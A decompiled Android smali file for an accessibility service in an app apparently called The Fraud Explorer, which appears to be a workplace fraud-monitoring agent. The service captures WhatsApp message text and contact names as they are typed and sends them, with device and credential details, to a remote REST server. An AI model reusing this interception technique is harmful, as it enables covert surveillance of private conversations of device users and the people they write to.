.class public Lcom/nf/thefraudexplorer/AccessibilityHelper;
.super Landroid/accessibilityservice/AccessibilityService;
.source "AccessibilityHelper.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 28
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    return-void
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 14

    const-string v0, "type a message"

    const-string v1, "general"

    .line 33
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v2

    .line 34
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    .line 36
    invoke-static {}, Lcom/nf/thefraudexplorer/GlobalApplication;->getAppContext()Landroid/content/Context;

    move-result-object v4

    const/16 v5, 0x10

    const/4 v6, 0x0

    const-string v7, "whatsapp"

    if-eq v2, v5, :cond_0

    goto :goto_0

    .line 44
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    .line 48
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 50
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const-string v8, "escribe un mensaje"

    if-nez v5, :cond_1

    :try_start_1
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_2

    :cond_1
    sput-object v6, Lcom/nf/thefraudexplorer/Utilities;->finalChatMessage:Ljava/lang/String;

    :cond_2
    if-eqz v2, :cond_3

    .line 51
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    sput-object v2, Lcom/nf/thefraudexplorer/Utilities;->finalChatMessage:Ljava/lang/String;

    :cond_3
    :goto_0
    if-nez v3, :cond_4

    return-void

    .line 58
    :cond_4
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    .line 60
    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->analyticsStatus(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "enabled"

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    const-string v2, ":id/back"

    if-eqz v0, :cond_9

    const/4 v0, 0x0

    :try_start_2
    const-string v5, "com.whatsapp:id/conversation_contact_name"

    .line 66
    invoke-virtual {v3, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    .line 68
    invoke-interface {v5}, Ljava/util/List;->size()I

    move-result v8

    if-lez v8, :cond_5

    .line 70
    invoke-interface {v5, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 71
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_5

    .line 73
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v8

    if-nez v8, :cond_5

    sput-object v5, Lcom/nf/thefraudexplorer/Utilities;->finalChatContact:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 80
    :catch_0
    :cond_5
    :try_start_3
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_a

    .line 84
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_a

    .line 90
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 92
    invoke-static {}, Lcom/nf/thefraudexplorer/Utilities;->getRemoteAnalyticsStatus()V

    .line 97
    :cond_6
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v5, ":id/date"

    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_7

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, ":id/quoted_title"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_a

    .line 99
    :cond_7
    sget-object v2, Lcom/nf/thefraudexplorer/Utilities;->finalChatMessage:Ljava/lang/String;

    if-eqz v2, :cond_a

    sget-object v2, Lcom/nf/thefraudexplorer/Utilities;->finalChatMessage:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x3

    if-le v2, v3, :cond_a

    .line 103
    invoke-virtual {p0}, Lcom/nf/thefraudexplorer/AccessibilityHelper;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 108
    :try_start_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p1
    :try_end_4
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_1

    :catch_1
    move-object p1, v6

    :goto_1
    if-eqz p1, :cond_8

    .line 117
    :try_start_5
    invoke-virtual {v2, p1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object p1

    goto :goto_2

    :cond_8
    const-string p1, "(unknown)"

    :goto_2
    check-cast p1, Ljava/lang/String;

    check-cast p1, Ljava/lang/String;

    .line 118
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, " - Chat with "

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p1, Lcom/nf/thefraudexplorer/Utilities;->finalChatContact:Ljava/lang/String;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 122
    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->agentID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1, v1}, Lcom/nf/thefraudexplorer/Cryptography;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/nf/thefraudexplorer/Cryptography;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->agentVersion(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/nf/thefraudexplorer/Cryptography;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->serverPassword(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v1}, Lcom/nf/thefraudexplorer/Cryptography;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->companyDomain(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v1}, Lcom/nf/thefraudexplorer/Cryptography;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v0, v2, v3, v1}, Lcom/nf/thefraudexplorer/Utilities;->reportOnline(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 126
    invoke-static {}, Lcom/nf/thefraudexplorer/Utilities;->messageSanitizer()V

    .line 130
    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->agentID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-static {}, Lcom/nf/thefraudexplorer/Utilities;->getLocalIpAddress()Ljava/lang/String;

    move-result-object v8

    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->companyDomain(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->RESTusername(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v4}, Lcom/nf/thefraudexplorer/Settings;->RESTpassword(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    sget-object v13, Lcom/nf/thefraudexplorer/Utilities;->finalChatMessage:Ljava/lang/String;

    invoke-static/range {v7 .. v13}, Lcom/nf/thefraudexplorer/Utilities;->sendRESTData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 134
    sput-object v6, Lcom/nf/thefraudexplorer/Utilities;->finalChatMessage:Ljava/lang/String;

    goto :goto_3

    .line 142
    :cond_9
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_a

    .line 144
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_a

    .line 148
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_a

    .line 150
    invoke-static {}, Lcom/nf/thefraudexplorer/Utilities;->getRemoteAnalyticsStatus()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_3

    :catch_2
    move-exception p1

    .line 158
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "ERROR : Accessibility Event : "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/nf/thefraudexplorer/Utilities;->appLog(Ljava/lang/String;)V

    .line 159
    invoke-virtual {p1}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "[TFE-ACCSS-EX]: "

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_a
    :goto_3
    return-void
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method public onServiceConnected()V
    .locals 2

    .line 169
    invoke-virtual {p0}, Lcom/nf/thefraudexplorer/AccessibilityHelper;->getServiceInfo()Landroid/accessibilityservice/AccessibilityServiceInfo;

    move-result-object v0

    const/4 v1, -0x1

    .line 170
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    .line 171
    invoke-virtual {p0, v0}, Lcom/nf/thefraudexplorer/AccessibilityHelper;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    return-void
.end method
